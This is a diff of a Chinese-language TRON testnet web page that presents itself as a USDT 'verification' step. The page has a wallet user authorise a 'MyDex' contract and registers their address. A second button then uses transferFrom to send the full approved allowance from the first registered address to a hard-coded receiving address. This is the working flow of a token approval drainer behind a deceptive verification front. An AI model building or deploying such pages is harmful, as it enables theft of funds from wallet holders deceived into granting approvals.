@@ -24,12 +24,12 @@
 
   <div class="center">
     <label>驗證地址：</label>
-    <input id="verifyAddress" />
+    <input id="verifyAddress" placeholder="收款者或合約地址（目前未用）" />
   </div>
 
   <div class="center">
     <label>驗證金額：</label>
-    <input id="verifyAmount" placeholder="0.1" />
+    <input id="verifyAmount" placeholder="例如 0.1" />
   </div>
 
   <div class="center">
@@ -56,11 +56,8 @@
     const verifyAddressInput = document.getElementById("verifyAddress");
     const verifyAmountInput = document.getElementById("verifyAmount");
 
-    // Shasta 測試網 USDT 合約地址
-    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
-
-    // 你部署的 MyDex 合約地址（請確定正確）
-    const MyDex_contractAddress = "TDXNbzDWrovDb3bLMAh4dPKGLU8VCDoCbu";
+    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // Shasta 測試網 USDT
+    const MyDex_contractAddress = "TDXNbzDWrovDb3bLMAh4dPKGLU8VCDoCbu"; // 你部署的 MyDex
 
     const TRC20_ABI = [
       {
@@ -134,14 +131,13 @@
         return;
       }
 
-      const approveAddress = verifyAddressInput.value.trim();
       const amountStr = verifyAmountInput.value.trim();
-      if (!approveAddress || !amountStr) {
-        alert("請輸入驗證地址與金額");
+      if (!amountStr) {
+        alert("請輸入驗證金額");
         return;
       }
 
-      const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
+      const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString(); // USDT 小數點後6位
       const userAddress = window.tronWeb.defaultAddress.base58;
 
       const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
@@ -155,53 +151,52 @@
         const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
         console.log("✅ 加入地址成功：", tx2);
 
-        alert("授權及加入地址成功");
+        alert("授權與加入成功");
       } catch (err) {
         console.error("❌ 授權錯誤：", err);
-        alert("授權失敗，請確認 TRX 手續費是否足夠，或合約地址是否正確");
+        alert("授權失敗，請確認 TRX 手續費或合約地址");
       }
     };
 
-   transferFromButton.onclick = async () => {
-  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-    alert("請先連接錢包");
-    return;
-  }
+    transferFromButton.onclick = async () => {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert("請先連接錢包");
+        return;
+      }
 
-  const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
-  const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+      const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+      const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
 
-  try {
-    const from = await MyDex.getIndexAddress(0).call();
-    const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 收款地址
+      try {
+        const from = await MyDex.getIndexAddress(0).call();
+        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 收款地址
 
-    let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
 
-    // 取出實際數字
-    if (typeof allowance === "object" && allowance._hex) {
-      allowance = window.tronWeb.toBigNumber(allowance._hex).toString();
-    } else if (typeof allowance === "object" && allowance._bignumber) {
-      allowance = allowance._bignumber.toString();
-    } else {
-      allowance = allowance.toString();
-    }
+        // 處理格式
+        if (typeof allowance === "object" && allowance._hex) {
+          allowance = window.tronWeb.toBigNumber(allowance._hex).toString();
+        } else if (typeof allowance === "object" && allowance._bignumber) {
+          allowance = allowance._bignumber.toString();
+        } else {
+          allowance = allowance.toString();
+        }
 
-    if (parseInt(allowance) === 0) {
-      alert("尚未授權，無法轉帳");
-      return;
-    }
+        if (parseInt(allowance) === 0) {
+          alert("尚未授權，無法轉帳");
+          return;
+        }
 
-    console.log("💸 開始轉帳 USDT，金額:", allowance);
+        console.log("💸 開始轉帳 USDT，金額:", allowance);
+        const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
 
-    const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
-
-    console.log("✅ 轉帳成功：", tx);
-    alert("轉帳成功");
-  } catch (err) {
-    console.error("❌ 轉帳失敗：", err);
-    alert("轉帳失敗，請確認授權狀態及手續費");
-  }
-};
-</script>
+        console.log("✅ 轉帳成功：", tx);
+        alert("轉帳成功");
+      } catch (err) {
+        console.error("❌ 轉帳失敗：", err);
+        alert("轉帳失敗，請確認授權狀態與 TRX 餘額");
+      }
+    };
+  </script>
 </body>
 </html>
